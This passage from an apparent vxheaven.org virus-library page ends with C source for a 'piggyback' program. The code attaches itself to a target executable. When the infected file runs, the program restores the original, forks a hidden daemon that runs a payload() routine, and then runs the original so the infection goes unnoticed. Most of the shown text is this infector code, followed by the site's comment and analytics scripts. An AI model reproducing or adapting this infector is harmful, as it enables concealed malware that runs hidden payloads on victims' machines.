&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>name<span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strrchr.html"><span style="color: #000066;">strrchr</span></a><span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">'/'</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> name<span style="color: #339933;">++;</span><br/>
&nbsp; <span style="color: #b1b100;">else</span> name<span style="color: #339933;">=</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcmp.html"><span style="color: #000066;">strcmp</span></a><span style="color: black;">&#40;</span>name<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;piggyback&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* we are not already piggybacked*/</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>argc<span style="color: #339933;">!=</span><span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Syntax: %s [filename]<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a><span style="color: black;">&#40;</span><span style="color: #0000dd;">3</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span>find_fullname<span style="color: black;">&#40;</span>fullname<span style="color: #339933;">,</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Cannot find myself: %s<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a><span style="color: black;">&#40;</span><span style="color: #0000dd;">5</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>piggyback<span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>fullname<span style="color: black;">&#41;</span><span style="color: #339933;">&gt;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Syntax: Cannot piggyback %s:<span style="color: #000099; font-weight: bold;">\n</span>%s<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strerror.html"><span style="color: #000066;">strerror</span></a><span style="color: black;">&#40;</span>errno<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a><span style="color: black;">&#40;</span><span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span> &nbsp; &nbsp; &nbsp;<br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: #b1b100;">else</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* this is piggybacked code! */</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span>find_fullname<span style="color: black;">&#40;</span>fullname<span style="color: #339933;">,</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a><span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span>restore<span style="color: black;">&#40;</span>fullname<span style="color: #339933;">,</span>outname<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a><span style="color: black;">&#40;</span><span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* our payload will run like a daemon */</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>fork<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">==</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; setsid<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>fork<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">==</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; chdir<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;/&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; umask<span style="color: black;">&#40;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; close<span style="color: black;">&#40;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>close<span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>close<span style="color: black;">&#40;</span><span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; fd<span style="color: #339933;">=</span>open<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;/dev/null&quot;</span><span style="color: #339933;">,</span>O_RDWR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; fd<span style="color: #339933;">=</span>open<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;/dev/null&quot;</span><span style="color: #339933;">,</span>O_RDWR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; fd<span style="color: #339933;">=</span>open<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;/dev/null&quot;</span><span style="color: #339933;">,</span>O_RDWR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; payload<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a><span style="color: black;">&#40;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a><span style="color: black;">&#40;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; wait<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>status<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; newarg<span style="color: #339933;">=</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/malloc.html"><span style="color: #000066;">malloc</span></a><span style="color: black;">&#40;</span><span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: #339933;">*</span><span style="color: black;">&#40;</span>argc<span style="color: #339933;">+</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">&#40;</span>i<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>i<span style="color: #339933;">&lt;</span>argc<span style="color: #339933;">;</span>i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span> newarg<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: #339933;">=</span>argv<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span>fork<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <br/>
&nbsp; &nbsp; &nbsp; execvp<span style="color: black;">&#40;</span>outname<span style="color: #339933;">,</span>newarg<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">else</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* wait for exit status and remove temp file */</span><br/>
&nbsp; &nbsp; &nbsp; wait<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>status<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/remove.html"><span style="color: #000066;">remove</span></a><span style="color: black;">&#40;</span>outname<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> WEXITSTATUS<span style="color: black;">&#40;</span>status<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; <br/>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vkp00">de</a><a href="/lib/index.php?lang=en&amp;id=vkp00">en</a><a href="/lib/index.php?lang=es&amp;id=vkp00">es</a><a href="/lib/index.php?lang=it&amp;id=vkp00">it</a><a href="/lib/index.php?lang=fr&amp;id=vkp00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vkp00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vkp00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vkp00">ua</a></div>
</body>
</html>
